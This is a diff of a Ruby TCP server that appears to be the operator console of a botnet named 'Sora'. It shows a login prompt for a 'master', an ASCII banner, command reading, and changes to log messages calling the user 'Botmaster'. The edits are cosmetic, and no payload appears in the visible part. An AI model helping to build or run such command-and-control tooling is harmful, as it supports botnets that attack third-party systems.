@@ -21,7 +21,7 @@ server = TCPServer.new "0.0.0.0", ARGV[0].to_i  # Change this if you want
 cmd = ''
 loop do
   Thread.start(server.accept) do |master|
-    print "[*] Connection from #{master.peeraddr[3]}\n"
+    print "[*] Master connection from #{master.peeraddr[3]}\n"
     master.print "Username: "
     inputted_uname = master.gets
     master.print "Password: "
@@ -37,7 +37,9 @@ loop do
 ███████╗    ██║   ██║    ██████╔╝    ███████║
 ╚════██║    ██║   ██║    ██╔══██╗    ██╔══██║
 ███████║    ╚██████╔╝    ██║  ██║    ██║  ██║
-╚══════╝     ╚═════╝     ╚═╝  ╚═╝    ╚═╝  ╚═╝\n\n"
+╚══════╝     ╚═════╝     ╚═╝  ╚═╝    ╚═╝  ╚═╝
+
+Made with <3 by AM-77\n\n"
     while (cmd != 'exit')
       begin
         master.print "sora > "
@@ -48,7 +50,7 @@ loop do
         rescue NoMethodError => nme # Prevents crash if client quits with CRTL+C
           next
         end
-        puts cmd
+        puts "Master command recieved: #{cmd}"  # prints to main server
         split = cmd.split(' ')
 
         if cmd == "help"
@@ -84,7 +86,7 @@ loop do
       rescue Errno::EPIPE
         next
       rescue Errno::EADDRINUSE
-        puts ""
+        puts "Botmaster: Something's listening on port #{ARGV[1]}"
       end
   end
   master.puts "Bye bye!"
